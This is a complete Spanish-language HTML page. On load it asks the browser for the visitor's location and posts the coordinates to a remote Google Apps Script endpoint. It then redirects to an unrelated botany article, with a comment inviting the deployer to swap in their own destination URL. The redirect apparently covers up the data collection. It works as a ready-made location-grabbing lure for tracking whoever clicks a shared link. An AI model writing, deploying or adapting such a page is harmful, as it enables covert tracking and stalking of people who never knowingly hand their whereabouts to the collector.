<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Obteniendo Ubicación...</title>
    <script>
        async function obtenerUbicacion() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async function(position) {
                        let lat = position.coords.latitude;
                        let lon = position.coords.longitude;
                        console.log("Latitud:", lat);
                        console.log("Longitud:", lon);

                        try {
                            // Enviar ubicación a Google Apps Script
                            let respuesta = await fetch("https://script.google.com/macros/s/AKfycbw6HEcn1ON-IbGw9TZ8oNlswvaU1SNinXLXsunyVv4ZQuX-JulEoN-GZJvr86WCWtZw/exec", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({ latitud: lat, longitud: lon })
                            });

                            let textoRespuesta = await respuesta.text();
                            console.log("Respuesta del servidor:", textoRespuesta);

                        } catch (error) {
                            console.error("Error al enviar datos:", error);
                        }

                        // Redirigir después de enviar la ubicación
                        window.location.href = "https://concepto.de/botanica/"; // Cambia por tu URL destino
                    },
                    function(error) {
                        alert("Activa la ubicación en tu navegador.");
                    }
                );
            } else {
                alert("Tu navegador no soporta geolocalización.");
            }
        }
    </script>
</head>
<body onload="obtenerUbicacion()">
    <h2>Obteniendo tu ubicación...</h2>
</body>
</html>
